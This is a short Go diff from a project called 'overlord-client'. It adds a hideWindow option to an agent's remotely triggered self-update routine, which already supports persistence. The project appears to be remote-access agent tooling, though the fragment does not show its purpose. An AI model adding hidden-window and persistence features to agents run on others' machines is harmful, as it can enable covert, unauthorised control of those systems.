@@ -17,7 +17,7 @@ import (
 	"overlord-client/cmd/agent/wire"
 )
 
-func HandleAgentUpdate(ctx context.Context, env *agentRuntime.Env, cmdID string, sourcePath string, expectedHash string) error {
+func HandleAgentUpdate(ctx context.Context, env *agentRuntime.Env, cmdID string, sourcePath string, expectedHash string, hideWindow bool) error {
 	sourcePath = strings.TrimSpace(sourcePath)
 	if sourcePath == "" {
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing update path"})
@@ -42,7 +42,7 @@ func HandleAgentUpdate(ctx context.Context, env *agentRuntime.Env, cmdID string,
 	go func() {
 		// Let the command_result flush before beginning process replacement.
 		time.Sleep(250 * time.Millisecond)
-		if err := runAgentUpdate(sourceAbs, env.Cfg.EnablePersistence); err != nil {
+		if err := runAgentUpdate(sourceAbs, env.Cfg.EnablePersistence, hideWindow); err != nil {
 			log.Printf("agent_update: %v", err)
 			return
 		}
